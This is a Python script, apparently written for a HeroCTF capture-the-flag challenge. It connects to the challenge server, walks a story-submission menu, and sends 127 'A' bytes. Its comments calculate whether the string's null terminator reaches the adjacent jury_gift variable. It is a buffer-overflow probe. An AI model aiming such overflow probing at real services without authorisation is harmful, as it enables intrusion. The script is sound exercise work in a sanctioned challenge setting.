#!/usr/bin/env python3
import socket
import time
import struct

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect(('dyn06.heroctf.fr', 13683))
    return s

def recv_until(s, text):
    data = b''
    while text not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def test_overflow():
    s = connect()
    time.sleep(0.5)
    
    # Receive menu
    recv_until(s, b'>')
    
    # Submit story
    s.send(b'1\n')
    time.sleep(0.5)
    recv_until(s, b':')
    
    # Send length 128 (maximum)
    s.send(b'128\n')
    time.sleep(0.5)
    recv_until(s, b':')
    
    # Send exactly 127 bytes (max copy) + try to see if we can affect jury_gift
    # last_story is at 0x404160, jury_gift is at 0x4041e0
    # Distance is 128 bytes (0x80)
    # If we copy 127 bytes, null terminator is at 0x404160 + 127 = 0x4041df
    # That's 1 byte before jury_gift (0x4041e0)
    payload = b'A' * 127
    s.send(payload)
    time.sleep(0.5)
    
    # Show jury info to see jury_gift value
    recv_until(s, b'>')
    s.send(b'3\n')
    time.sleep(0.5)
    data = recv_until(s, b'>')
    print(data.decode('utf-8', errors='ignore'))
    
    s.close()

if __name__ == '__main__':
    test_overflow()
